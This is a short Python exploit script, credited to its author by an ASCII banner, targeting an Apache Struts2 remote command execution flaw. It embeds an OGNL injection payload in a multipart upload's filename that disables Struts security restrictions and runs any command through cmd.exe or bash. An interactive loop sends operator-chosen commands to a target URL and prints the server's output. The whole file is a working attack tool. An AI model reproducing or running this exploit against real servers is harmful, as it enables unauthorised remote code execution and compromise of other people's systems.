import requests

print('code by 北风飘然')
print('''
 _____   _       ___   _____   _____        ___   __   _
|  _  \ | |     /   | /  _  \ |  _  \      /   | |  \ | |
| |_| | | |    / /| | | | | | | |_| |     / /| | |   \| |
|  ___/ | |   / / | | | | | | |  _  /    / / | | | |\   |
| |     | |  / /  | | | |_| | | | \ \   / /  | | | | \  |
|_|     |_| /_/   |_| \_____/ |_|  \_\ /_/   |_| |_|  \_|
''')


def exp(url,command):
    header = {'Content-Length':'1000000000','Cache-Control':'max-age=0','Upgrade-Insecure-Requests':'1','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
              'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
              }
    a = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
    a = a.replace('whoami',command)
    files ={"upload":(a,open('exp.txt', 'rb'),"text/plain")
    }

    r= requests.post(url, files=files)
    print(r.text)



if __name__=='__main__':
    url = input('addrs \n')
    a = 1
    while a != 'q':
        command = input('command :\n')
        exp(url,command)
